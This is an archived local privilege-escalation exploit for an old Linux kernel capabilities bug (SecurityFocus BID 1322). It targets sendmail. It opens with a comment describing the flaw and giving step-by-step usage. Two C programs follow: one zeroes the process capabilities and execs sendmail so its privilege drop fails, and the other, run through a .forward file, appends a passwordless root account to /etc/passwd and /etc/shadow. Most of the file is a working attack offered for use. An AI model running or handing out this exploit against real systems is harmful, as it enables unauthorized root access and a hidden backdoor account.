/*
source: http://www.securityfocus.com/bid/1322/info

POSIX "Capabilities" have recently been implemented in the Linux kernel. These "Capabilities" are an additional form of privilege control to enable more specific control over what priviliged processes can do. Capabilities are implemented as three (fairly large) bitfields, which each bit representing a specific action a privileged process can perform. By setting specific bits, the actions of priviliged processes can be controlled -- access can be granted for various functions only to the specific parts of a program that require them. It is a security measure. The problem is that capabilities are copied with fork() execs, meaning that if capabilities are modified by a parent process, they can be carried over. The way that this can be exploited is by setting all of the capabilities to zero (meaning, all of the bits are off) in each of the three bitfields and then executing a setuid program that attempts to drop priviliges before executing code that could be dangerous if run as root, such as what sendmail does. When sendmail attempts to drop priviliges using setuid(getuid()), it fails not having the capabilities required to do so in its bitfields. It continues executing with superuser priviliges, and can run a users .forward file as root leading to a complete compromise. Procmail can also be exploited in this manner. 

compile these 2 and create a file "mail":

From: yomama@foobar.com
To: localuser@localdomain.com
Subject: foo
bar
.

then create a .forward with:
|/path/to/add

then just do: ./ex < mail

this should add a user yomama with uid/gid = 0 and without a password
set
a simple su - yomama should give you root.

This exploit was written by me in a hurry, I hope there are no mistakes
*/


-- snip -- ex.c --
  
#include <linux/capability.h>

int main (void) {
   cap_user_header_t header;
   cap_user_data_t data;
   
   header = malloc(8);
   data = malloc(12);
   
   header->pid = 0;
   header->version = _LINUX_CAPABILITY_VERSION;
   
   data->inheritable = data->effective = data->permitted = 0;
   capset(header, data);

   execlp("/usr/sbin/sendmail", "sendmail", "-t", NULL);
}

-- snap -- ex.c --

-- snip -- add.c --

#include <fcntl.h>

int main (void) {
   int fd;
   char string[40];
   
   seteuid(0);
   fd = open("/etc/passwd", O_APPEND|O_WRONLY);
   strcpy(string, "yomama:x:0:0::/root:/bin/sh\n");
   write(fd, string, strlen(string));
   close(fd);
   fd = open("/etc/shadow", O_APPEND|O_WRONLY);
   strcpy(string, "yomama::11029:0:99999:7:::");
   write(fd, string, strlen(string));
   close(fd);
   
}

-- snap -- add.c --